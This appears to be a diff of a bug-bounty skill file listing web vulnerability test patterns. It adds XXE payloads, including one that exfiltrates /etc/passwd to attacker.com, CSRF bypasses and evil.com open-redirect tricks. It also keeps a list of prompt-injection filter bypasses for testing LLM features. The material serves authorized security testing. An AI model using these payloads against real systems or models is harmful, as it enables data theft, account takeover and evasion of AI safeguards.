@@ -15,7 +15,10 @@ For deep dives, route to the specialized skill or reference file:
 |-------|----------|
 | **BOLA/BFLA/privilege escalation/session/MFA/OAuth/JWT/SSO** | [auth-testing](../auth-testing/SKILL.md) + [auth-mechanisms.md](../auth-testing/reference/auth-mechanisms.md) |
 | **API design flaws (GraphQL, gRPC, WebSocket)** | [api-security](../api-security/SKILL.md) + [api-patterns.md](../api-security/reference/api-patterns.md) |
-| **Business logic, payment flows, race conditions** | [reference/business-logic.md](reference/business-logic.md) |
+| **CSRF, SameSite bypass** | [vuln-patterns](#cross-site-request-forgery-csrf) (below) |
+| **CORS misconfiguration** | [client-side-security](../client-side-security/SKILL.md) |
+| **Business logic, payment flows** | [reference/business-logic.md](reference/business-logic.md) |
+| **Race conditions (single-packet, HTTP/2 multiplex)** | [http-desync](../http-desync/SKILL.md) |
 | **AI/LLM/MCP/agent patterns** | [ai-hunting](../ai-hunting/SKILL.md) + [reference/ai-mcp-vulns.md](reference/ai-mcp-vulns.md) |
 | **GraphQL, JWT format, OAuth format, workflow automation** | [reference/web-vulns.md](reference/web-vulns.md) |
 | **Infrastructure, MotW, SSRF chains, MDM, remote desktop** | [reference/infrastructure-vulns.md](reference/infrastructure-vulns.md) |
@@ -29,19 +32,17 @@ The patterns below cover the **core web vulnerability classes** that don't have 
 
 ## MITRE CWE Top 25 (2025)
 
-The 2025 list, compiled from 39,000+ vulnerabilities disclosed June 2024-June 2025, shows **authorization flaws climbing fast** while traditional injection remains at the top:
+2025 list (39K+ vulns, June 2024-June 2025) — **authorization flaws climbing fast**:
 
 | Rank | CWE | Name | Trend |
 |------|-----|------|-------|
-| 1 | CWE-79 | Cross-Site Scripting (XSS) | Stable at #1 (score 60.38) |
-| 2 | CWE-89 | SQL Injection | Up 1 position |
-| 3 | CWE-352 | Cross-Site Request Forgery (CSRF) | Up 1 position |
-| 4 | **CWE-862** | **Missing Authorization** | **Up 5 positions — biggest climber** |
+| 1 | CWE-79 | XSS | Stable at #1 |
+| 2 | CWE-89 | SQL Injection | Up 1 |
+| 3 | CWE-352 | CSRF | Up 1 |
+| 4 | **CWE-862** | **Missing Authorization** | **Up 5 — biggest climber** |
 | 5 | CWE-787 | Out-of-Bounds Write | Stable |
 
-**New entries in 2025:** CWE-120 (Classic Buffer Overflow), CWE-121 (Stack-based Buffer Overflow), CWE-122 (Heap-based Buffer Overflow), CWE-284 (Improper Access Control), CWE-639 (Authorization Bypass Through User-Controlled Key), CWE-770 (Allocation of Resources Without Limits).
-
-**Key trend:** Authorization-related vulnerabilities (IDOR, BOLA, missing access controls) are rising as the most impactful vulnerability class, displacing traditional injection flaws in bounty value. Valid IDOR reports grew **116% over 5 years** and jumped **29% YoY**; improper access control up **18% YoY** (HackerOne 2025). IDOR is the #1 vulnerability class for government programs (18% of payouts), medical technology (36%), and professional services (31%). XSS reports are **down 10% since 2023** with declining payouts. Programs are shifting rewards toward identity, access, and business logic flaws.
+**Key trend:** IDOR reports grew **116% over 5 years** (+29% YoY); access control up **18% YoY** (HackerOne 2025). XSS reports **down 10% since 2023**. Programs shifting rewards toward identity, access, and business logic.
 
 ---
 
@@ -125,15 +126,7 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 | 9 | Markdown XSS | `[click](javascript:alert(1))` | Markdown renderers |
 | 10 | CSP bypass | Check for unsafe-inline, unsafe-eval, loose whitelists | When CSP blocks basic payloads |
 
-**Framework-specific:**
-
-| Framework | Where to focus |
-|-----------|---------------|
-| React | `dangerouslySetInnerHTML`, `href` attributes, SSR hydration |
-| Angular | Template injection `{{}}`, `bypassSecurityTrust*` APIs |
-| Vue | `v-html` directive, template expressions |
-| jQuery | `.html()`, `.append()` with user input |
-| Server-rendered | Any reflected parameter, error messages |
+**Framework focus:** React (`dangerouslySetInnerHTML`, SSR hydration), Angular (template injection `{{}}`, `bypassSecurityTrust*`), Vue (`v-html`), jQuery (`.html()`, `.append()` with user input). For deep DOM XSS, CSP, PostMessage: see [client-side-security](../client-side-security/SKILL.md).
 
 ---
 
@@ -230,6 +223,71 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 
 ---
 
+### XML External Entity (XXE)
+
+**What it is:** Exploiting XML parsers to read files, perform SSRF, or achieve RCE via external entity processing.
+
+**Where to look:** SOAP/XML API endpoints, file upload accepting XML/DOCX/XLSX/SVG, SAML SSO, RSS/Atom feed parsers, sitemap processors.
+
+| # | Test | Payload/Method | What to look for |
+|---|------|---------------|-----------------|
+| 1 | Classic file read | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | File contents in response |
+| 2 | Blind OOB exfil | `<!ENTITY % xxe SYSTEM "http://attacker.com/?d=file:///etc/passwd">` | Callback on attacker server |
+| 3 | Parameter entity | `<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;` | DTD fetched from external |
+| 4 | Error-based | Trigger XML parse error including file contents in error message | File data in error |
+| 5 | SVG upload | Upload SVG with `<svg xmlns="..."><text>&xxe;</text></svg>` | File read via image preview |
+| 6 | DOCX/XLSX | Modify `[Content_Types].xml` in Office file with XXE payload | Processed on server |
+| 7 | SAML response | Inject XXE in SAML assertion XML | Identity provider processes entity |
+| 8 | SOAP endpoint | Add DOCTYPE with entity in SOAP request body | Server fetches external resource |
+
+**Severity:** File read = High ($2K-$15K). SSRF via XXE = High-Critical. RCE (via `expect://` or PHP filters) = Critical. CWE-611, consistently MITRE Top 25.
+
+---
+
+### Cross-Site Request Forgery (CSRF)
+
+**What it is:** Forcing authenticated users to perform unintended actions by exploiting automatic cookie inclusion.
+
+**Where to look:** State-changing endpoints (profile/password/email change), API endpoints without anti-CSRF tokens, forms using cookie auth without SameSite=Strict, admin actions, financial operations.
+
+| # | Test | What to do | What to look for |
+|---|------|-----------|-----------------|
+| 1 | Missing token | Remove CSRF token from request | Action still succeeds |
+| 2 | Token reuse | Use another user's CSRF token | Server accepts cross-user token |
+| 3 | SameSite bypass | Top-level navigation (`window.open`, `<a>` tag) with SameSite=Lax | Cookies sent on cross-origin GET |
+| 4 | JSON content-type | POST JSON body cross-origin with `text/plain` content-type | Server parses as JSON despite content-type |
+| 5 | Method override | `_method=POST` in GET request to bypass CSRF on POST-only | Action via GET (no CSRF needed) |
+| 6 | Subdomain abuse | If cookies set for `.example.com`, host payload on any subdomain | Cookies auto-included |
+| 7 | Token in cookie | Double-submit cookie without server validation, inject via subdomain | Attacker controls both values |
+| 8 | Flash/PDF redirect | SWF or PDF issuing cross-origin POST with custom headers | Legacy browser bypass |
+
+**Severity:** Email/password change = High ($1K-$5K). Admin actions = High-Critical. Non-sensitive actions = Low/Informational. CWE-352, #3 on 2025 MITRE Top 25.
+
+---
+
+### Open Redirect
+
+**What it is:** Redirecting users to attacker-controlled sites via application redirect functionality. Critical as chain component for OAuth token theft and phishing.
+
+**Where to look:** Login/logout redirects (`?next=`, `?redirect=`, `?return_to=`), OAuth `redirect_uri`, after-action redirects (post-payment, post-signup), URL shortener/proxy endpoints, SSO callbacks.
+
+| # | Test | Payload | What to look for |
+|---|------|---------|-----------------|
+| 1 | Direct URL | `?redirect=https://evil.com` | Redirected to external domain |
+| 2 | Protocol-relative | `?redirect=//evil.com` | Bypass scheme-only filters |
+| 3 | URL encoding | `?redirect=https%3A%2F%2Fevil.com` | Decoded and redirected |
+| 4 | Backslash trick | `?redirect=https://evil.com\@legitimate.com` | Parser confusion |
+| 5 | @ confusion | `?redirect=https://legitimate.com@evil.com` | Browser follows evil.com |
+| 6 | Null byte | `?redirect=https://evil.com%00.legitimate.com` | Truncation bypass |
+| 7 | Data URI | `?redirect=data:text/html,<script>alert(1)</script>` | XSS via redirect |
+| 8 | Meta refresh | If redirect uses HTML meta refresh, inject via parameter | Control destination |
+
+**Bypasses:** Prepend legit domain (`legitimate.com.evil.com`), use subdomain (`evil.legitimate.com`), double URL encode (`%252F%252Fevil.com`), leading whitespace, mixed case (`hTTps://`), fragment (`legitimate.com#@evil.com`).
+
+**Severity:** Open redirect alone = Low ($100-$500). Chained with OAuth token theft = High ($2K-$10K). Chained with phishing to account takeover = High-Critical.
+
+---
+
 ### File Upload
 
 **What it is:** Exploiting file upload functionality to achieve code execution, XSS, or data exfiltration.
@@ -313,21 +371,15 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 
 **Tools:** Turbo Intruder (Burp extension), HTTP/2 single-packet attack technique, `race-the-web`.
 
+> **For advanced race condition techniques** (single-packet attack, last-byte sync, HTTP/2 multiplexing, session-based races): See [http-desync](../http-desync/SKILL.md)
+
 ---
 
 ### Deserialization
 
 **What it is:** Exploiting unsafe deserialization of user-controlled data to achieve RCE, privilege escalation, or data manipulation.
 
-**Where to look:**
-- APIs accepting serialized objects (Java, PHP, Python pickle, .NET)
-- Session tokens stored in cookies (especially Base64-encoded objects)
-- WebSocket messages with serialized payloads
-- Caching layers (Redis, Memcached) with serialized data
-- Message queues (RabbitMQ, Kafka) with serialized payloads
-- React Server Components Flight protocol (React2Shell, CVE-2025-55182)
-
-**Test patterns:**
+**Where to look:** APIs accepting serialized objects (Java, PHP, Python pickle, .NET), session cookies with Base64-encoded objects, WebSocket/message queue payloads, caching layers, React Server Components Flight protocol.
 
 | # | Test | What to do | What to look for |
 |---|------|-----------|-----------------|
@@ -347,14 +399,7 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 
 **What it is:** Modifying JavaScript object prototypes to affect application behavior across the entire runtime.
 
-**Where to look:**
-- APIs accepting deeply nested JSON objects
-- Object merge/extend operations (lodash `merge`, `defaultsDeep`)
-- GraphQL mutations with deeply nested inputs
-- Configuration endpoints accepting arbitrary key-value pairs
-- Any endpoint that recursively processes user-controlled objects
-
-**Test patterns:**
+**Where to look:** APIs accepting deeply nested JSON, object merge/extend ops (lodash `merge`, `defaultsDeep`), GraphQL mutations with nested inputs, config endpoints accepting arbitrary key-value pairs.
 
 | # | Test | Payload | What to look for |
 |---|------|---------|-----------------|
@@ -395,25 +440,9 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 | 9 | Token smuggling | Use homoglyphs, unicode, or encoding to bypass input filters | Filter bypass on LLM inputs |
 | 10 | Resource exhaustion | Craft prompts that cause excessive token generation or API calls | DoS via expensive LLM operations |
 
-**Severity guidance:**
+**Severity:** Prompt leak (no secrets) = Low-Medium. Prompt injection → data access/action = High-Critical. Output injection → XSS = High-Critical. Jailbreak (safety bypass only) = Low/Informational. Excessive agency = High-Critical.
 
-| Finding | Typical Severity | Reportable? |
-|---------|-----------------|-------------|
-| System prompt leak (no sensitive data) | Low-Medium | Usually yes, but low payout |
-| System prompt leak (contains API keys, internal URLs) | High-Critical | Definitely yes |
-| Direct prompt injection → data access | High-Critical | Yes |
-| Indirect prompt injection → action execution | Critical | Yes — high impact |
-| Output injection → XSS/SQLi | High-Critical | Yes — standard web vuln via AI |
-| Jailbreak (safety filter bypass only) | Low-Informational | Often N/A unless program explicitly scopes it |
-| Excessive agency → unauthorized actions | High-Critical | Yes |
-| Data exfiltration of PII/secrets | High-Critical | Yes |
-
-
-**Bypasses when prompt injection is filtered:**
-- Multi-turn context shifting, base64 encoding, translation-based injection
-- Reference injection (docs/URLs), role-play, markdown formatting abuse
-- Multimodal injection (hidden instructions in images), agentic chain injection
-- Few-shot injection, invisible Unicode (tag characters E0000-E007F)
+**Bypasses:** Multi-turn shifting, base64/translation encoding, reference injection (docs/URLs), role-play, multimodal injection (hidden instructions in images), agentic chain injection, few-shot injection, invisible Unicode (tag chars E0000-E007F).
 
 > **18 AI/LLM attack patterns + 63 MCP test patterns + LPCI + real-world incidents:** See [reference/ai-mcp-vulns.md](reference/ai-mcp-vulns.md)
 
@@ -455,23 +484,8 @@ This skill uses progressive disclosure. Detailed reference material is available
 
 ---
 
-## Using This Skill
+## Usage
 
-### With Target Context
-If you've already run `target-recon`, I'll tailor patterns to the detected tech stack and attack surface.
+With target context from `target-recon`, patterns are tailored to the detected stack. Without context, you get the full checklist. Ask mid-hunt: "I found a URL parameter that reflects — what XSS patterns should I try?"
 
-### Without Context
-I'll give you the full checklist for the vulnerability class you ask about.
-
-### During Hunting
-Ask as you go: "I found a URL parameter that reflects in the page — what XSS patterns should I try?"
-
----
-
-## Related Skills
-
-- **target-recon** — Identify the tech stack first, then use patterns for that stack
-- **program-research** — Know what the program pays for before prioritizing test patterns
-- **report-writing** — When you find something, write it up properly
-- **hunt-plan** (command) — Combine patterns with recon into a structured hunting session
-- **ai-hunting** — Specialized techniques for hunting AI/LLM vulnerabilities
+**Related:** target-recon (stack ID), program-research (payout priorities), report-writing (writeups), hunt-plan (structured sessions), ai-hunting (AI/LLM patterns).
